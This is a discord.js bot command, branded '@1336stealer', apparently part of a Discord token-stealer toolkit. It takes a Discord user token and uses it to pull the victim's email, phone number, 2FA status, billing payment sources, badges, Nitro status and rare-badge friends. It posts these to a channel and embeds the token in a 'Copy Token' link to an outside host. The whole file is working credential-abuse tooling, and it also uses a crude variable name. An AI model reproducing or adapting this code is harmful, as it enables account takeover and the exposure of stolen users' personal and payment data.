const Discord = require("discord.js")
const axios = require("axios")

module.exports.run = async (bot, message, args) => {
  let token = args[0];
  if (!token) return message.channel.send(`Invalid arguments! Use: ${bot.config.prefix}info <token>`);
  let json;
  await axios.get("https://discord.com/api/v9/users/@me", {
      headers: {
          "Content-Type": "application/json",
          "authorization": token
      }
  }).then(res => { json = res.data })
      .catch(() => { })
  if (!json) return message.channel.send('Invalid token!');
  const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:1336:1012704237127467151>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:1336:1012704448113545337>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:1336:1012704437204164738>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:1336:1012704348549156904>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:1336:1012704393876996127>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:1336:1012704359869599794>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:1336:1012704335156740157>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:1336:1012704416870170735>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:1336:1012704426600976484>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:1336:1012704403670712451>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:1336:1012704381973577759>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    })
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} - \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*No Rare Friends*"
    return {
        length: r.length,
        frien: gay
    }
}

async function getBilling(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    })
    var json = j.data

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:1336:1012751314431770624>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += ":credit_card:";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') b = `\`No Badges\``
    return b;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:1336:1012751667575394394>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:1336:1012751667575394394>";

            if (!info.premium_guild_since) return "<:1336:1012751667575394394>";

            let boost = ["<:1336:1012704249450332191>", "<:1336:1012704263304138883>", "<:1336:1012746877910913044>", "<:1336:1012704276738494544>", "<:1336:1012704286658023485>", "<:1336:969687191133499403>", "<:1336:1012704297361870859>", "<:1336:1012704320606720112>", "<:1336:1012704308195758171>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:1336:1012751667575394394> ${boost[i]}`
        default:
            return "";
    };
}

function getUserNitro(flags) {
    switch (flags) {
        case 1:
            return "\`Nitro Classic\`";
        case 2:
            return "\`Nitro Boost\`";
        default:
            return "\`No Nitro\`";
    };
}

  var billing = await getBilling(token);
  const info = new Discord.MessageEmbed()
  .setDescription(`<a:1336:1012706914527891476> **Token:**\n\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`)
  .addField("<:1336:1012707124763177022> Badges:", `${getBadges(json.flags)} ${await getNitro(json.premium_type, json.id, token)}`)
  .addField("<:1336:1012707326223982692> Nitro Type:", `${getUserNitro(json.premium_type)}`)
  .addField("<a:1336:1012707511830331442> Billing:", `${billing}`)
  .addField("<:1336:1012707773424865310> Phone:", `\`${json.phone || "No Phone"}\``)
  .addField("<:1336:1012707970653626408> Email:", `\`${json.email}\``)
  .addField("<a:1336:1012708614311526611> 2FA Enabled:", `\`${json.mfa_enabled ? "Yes" : "No"}\``)
  .setAuthor(`${json.username}#${json.discriminator} (${json.id})`, "https://media.discordapp.net/attachments/1012840502598582434/1013143149859831968/a_721d6729d0b5e1a8979ab7a445378e9a.gif")
  .setImage(`https://cdn.discordapp.com/banners/${json.id}/${json.banner}?size=512`)
  .setThumbnail(`https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`)
  .setFooter("@1336stealer")
  .setColor("2f3136")
  message.channel.send(info)
  }
module.exports.help = {
  name: "info"
}